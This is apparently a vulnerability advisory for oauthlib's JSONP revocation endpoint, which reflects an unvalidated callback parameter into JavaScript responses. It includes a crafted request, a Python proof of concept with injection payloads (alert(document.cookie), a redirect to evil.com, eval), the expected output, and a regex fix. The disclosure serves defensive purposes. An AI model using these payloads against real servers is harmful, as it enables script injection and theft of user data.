@@ -1,0 +1,145 @@
+Summary
+When enable_jsonp=True, oauthlib's RevocationEndpoint reflects the user-supplied callback parameter directly into JavaScript response bodies on both success and error paths without validating that it is a legal JSONP callback name. This allows arbitrary JavaScript response generation instead of a restricted function call, making the documented JSONP revocation feature unsafe for browser-based JSONP consumption when attackers can influence callback.
+
+Details
+The issue is in oauthlib/oauth2/rfc6749/endpoints/revocation.py.
+
+When enable_jsonp=True is passed to the RevocationEndpoint constructor, two code paths wrap the response body using the user-supplied request.callback parameter:
+
+# Error response path (line 72-73):
+if self.enable_jsonp and request.callback:
+    response_body = '{}({});'.format(request.callback, response_body)
+
+# Success response path (line 81-82):
+if self.enable_jsonp and request.callback:
+    response_body = request.callback + '();'
+The request.callback value comes from HTTP request parameters, either the query string or POST body, via the Request class in oauthlib/common.py (lines 394-395), which merges query and body parameters into _params. Any value the client sends as callback is used verbatim.
+
+There is no validation of any kind on the callback parameter:
+
+No check that it is a valid JavaScript identifier
+No whitelist of allowed characters
+No escaping or sanitization
+A safe JSONP implementation must validate that the callback is a legal JavaScript function name (e.g., matching ^[a-zA-Z_$][a-zA-Z0-9_$.]*$). Without this, the attacker controls the JavaScript code returned in the response body. This is the standard mitigation used by jQuery, Express.js, Google APIs, and other major JSONP implementations.
+
+How the injection works:
+
+An attacker sends a revocation request with a crafted callback value:
+
+POST /revoke HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+token=anything&callback=alert(document.cookie)//
+The server responds with:
+
+alert(document.cookie)//({"error": "invalid_client"});
+This is syntactically valid JavaScript. alert(document.cookie) executes as a statement, and // comments out the rest of the line. The attacker has full control over the code that appears before the //.
+
+Execution context and attack surface:
+
+JSONP works by having a browser load a remote script via <script src="...">. The loaded script executes in the origin of the including page, not the remote server. This means a <script src="https://auth.example.com/revoke?token=x&callback=payload"> tag on evil.com would execute the payload in evil.com's context, not the auth server's context.
+
+The impact comes from client-side integrations that consume this endpoint as trusted JSONP. If a legitimate OAuth client includes <script src> pointed at the revocation endpoint and an attacker can influence the callback value (e.g., via query parameter injection, a reflected value, or a man-in-the-middle downgrade), the attacker controls what code runs in the client application's origin. The authorization server becomes a source of attacker-controlled JavaScript that client applications trust and execute.
+
+Note: the enable_jsonp parameter defaults to False, so only deployments that explicitly opt in are affected. However, this is a supported, documented library feature, not a debug flag. The client-side library includes prepare_token_revocation_request() with an explicit callback parameter (oauthlib/oauth2/rfc6749/parameters.py, line 174), and the documentation shows JSONP revocation as a use case (oauthlib/oauth2/rfc6749/clients/base.py, lines 351-358). The existing test suite tests JSONP callback reflection with a benign value (test_revocation_endpoint.py, lines 91-101) but does not test for injection. Deployments that enable JSONP typically do so to support older browsers or cross-origin revocation from JavaScript clients, these are exactly the environments most sensitive to script injection.
+
+PoC
+Requirements: Python 3.x with oauthlib installed (pip install oauthlib).
+
+from oauthlib.oauth2.rfc6749.endpoints.revocation import RevocationEndpoint
+from oauthlib.oauth2.rfc6749.request_validator import RequestValidator
+
+
+class FailValidator(RequestValidator):
+    """Auth fails -> triggers error response path (lines 72-73)."""
+    def client_authentication_required(self, request, *a, **kw): return True
+    def authenticate_client(self, request, *a, **kw): return False
+    def authenticate_client_id(self, client_id, request, *a, **kw): return False
+
+
+class PassValidator(RequestValidator):
+    """Auth passes -> triggers success response path (lines 81-82)."""
+    def client_authentication_required(self, request, *a, **kw): return False
+    def authenticate_client_id(self, client_id, request, *a, **kw): return True
+    def revoke_token(self, token, token_type_hint, request, *a, **kw): pass
+
+
+payloads = [
+    "alert(document.cookie)//",
+    "window.location='https://evil.com/'//",
+    "eval('malicious')//",
+]
+
+# --- Error path (401) ---
+print("Error path (enable_jsonp=True, auth fails):")
+ep_fail = RevocationEndpoint(FailValidator(), enable_jsonp=True)
+for p in payloads:
+    h, body, status = ep_fail.create_revocation_response(
+        "https://auth.example.com/revoke", http_method="POST",
+        body=f"token=x&callback={p}")
+    assert p in body, "Payload not reflected"
+    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")
+
+# --- Success path (200) ---
+print("\nSuccess path (enable_jsonp=True, revocation succeeds):")
+ep_pass = RevocationEndpoint(PassValidator(), enable_jsonp=True)
+for p in payloads:
+    h, body, status = ep_pass.create_revocation_response(
+        "https://auth.example.com/revoke", http_method="POST",
+        body=f"token=x&callback={p}")
+    assert p in body, "Payload not reflected"
+    print(f"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}")
+
+# --- Control (default: enable_jsonp=False) ---
+print("\nControl (enable_jsonp=False, default):")
+ep_safe = RevocationEndpoint(FailValidator(), enable_jsonp=False)
+_, body, status = ep_safe.create_revocation_response(
+    "https://auth.example.com/revoke", http_method="POST",
+    body="token=x&callback=alert(1)//")
+assert "alert" not in body, "Payload should not be present"
+print(f"  [{status}] {body}")
+print("\nAll assertions passed.")
+Expected output:
+
+Error path (enable_jsonp=True, auth fails):
+  [401] Content-Type: application/json  Body: alert(document.cookie)//({"error": "invalid_client"});
+  [401] Content-Type: application/json  Body: window.location='https://evil.com/'//({"error": "invalid_client"});
+  [401] Content-Type: application/json  Body: eval('malicious')//({"error": "invalid_client"});
+
+Success path (enable_jsonp=True, revocation succeeds):
+  [200] Content-Type: (none)  Body: alert(document.cookie)//();
+  [200] Content-Type: (none)  Body: window.location='https://evil.com/'//();
+  [200] Content-Type: (none)  Body: eval('malicious')//();
+
+Control (enable_jsonp=False, default):
+  [401] {"error": "invalid_client"}
+
+All assertions passed.
+Both paths reflect the attacker's payload verbatim into the response body.
+
+Impact
+Any oauthlib-based authorization server that enables JSONP on the revocation endpoint (enable_jsonp=True) returns attacker-controlled JavaScript in its response body.
+
+Any page or application that loads this endpoint's response as JSONP and exposes attacker influence over the callback parameter will execute attacker-controlled code in its own origin. If a legitimate OAuth client uses JSONP revocation (as documented by oauthlib's client-side API) and an attacker can influence the callback value, the attacker controls what code runs in the client application, including access to the client page's DOM and any data normally accessible to scripts running in that origin.
+
+The JSONP feature is intended for legacy cross-origin browser support. Deployments that need it are typically JavaScript-heavy clients, exactly the environment most sensitive to script injection.
+
+Affected versions: oauthlib >= 0.6.1 through 3.3.1 (current) and master. The unsanitized callback has been present since the revocation endpoint was first introduced in 2013 (commit da775de). The enable_jsonp gate was added in 2014 (commit b85f89a) but no validation of the callback value was ever added.
+
+Suggested fix
+Validate the callback parameter against a strict pattern for legal JavaScript identifiers before using it in the response. Reject or ignore values that do not match:
+
+import re
+
+# Only allow safe JSONP callback names: valid JS identifiers, optionally dot-separated
+JSONP_CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*(\.[a-zA-Z_$][a-zA-Z0-9_$]*)*$')
+
+# In create_revocation_response(), before using request.callback:
+if self.enable_jsonp and request.callback:
+    if not JSONP_CALLBACK_PATTERN.match(request.callback):
+        request.callback = None
+This is the standard mitigation for JSONP callback injection and is the approach used by jQuery, Express.js, and Google APIs. It ensures only syntactically valid function names like package.hello_world are accepted, while blocking payloads like alert(document.cookie)//.
+
+As a secondary hardening measure, when JSONP is enabled, the response should set Content-Type: application/javascript (not application/json or empty) to ensure correct browser handling. Currently the success path returns no Content-Type at all, and the error path returns application/json.
+
+Alternatively, if JSONP is no longer considered a necessary feature, consider deprecating and removing the enable_jsonp option entirely. CORS is now supported by all modern browsers and is the standard mechanism for cross-origin API access.
